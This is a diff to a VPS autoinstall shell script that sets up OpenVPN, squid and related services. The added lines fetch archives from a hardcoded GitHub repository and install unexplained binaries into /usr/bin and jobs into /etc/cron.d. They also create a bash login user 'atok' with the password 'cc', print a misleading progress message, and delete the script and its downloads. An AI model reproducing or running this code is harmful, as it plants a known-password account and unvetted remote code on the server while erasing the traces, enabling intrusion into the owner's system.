@@ -160,8 +160,8 @@ sed -i "s/ipserver/$myip/g" /etc/squid/squid.conf
 # openvpn
 apt-get -y install openvpn
 cd /etc/openvpn/
-wget $source/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
-wget -O /etc/iptables.up.rules "$source/iptables.up.rules"
+wget https://raw.githubusercontent.com/cucuatok93/cucuatok/master/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/iptables.up.rules"
 sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
 sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
 iptables-restore < /etc/iptables.up.rules
@@ -181,14 +181,17 @@ sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/p
 apt-get -y install fail2ban;service fail2ban restart
 
 # etc
-wget -O /home/vps/public_html/client.ovpn "$source/client.ovpn"
-sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn;cd
-wget $source/cronjob.tar
-tar xf cronjob.tar;mv uptimes.php /home/vps/public_html/
+wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/client.ovpn"
+source="https://raw.githubusercontent.com/cucuatok93/cucuatok/master"
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+cd;wget https://raw.githubusercontent.com/cucuatok93/cucuatok/master/cronjob.tar
+tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
 mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
 chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
-useradd -m -g users -s /bin/bash sshvpn
-echo "atok:123456" | chpasswd
+useradd -m -g users -s /bin/bash atok
+echo "atok:cc" | chpasswd
+echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
+rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 
 # Badvpn
 apt-get -y install cmake make gcc
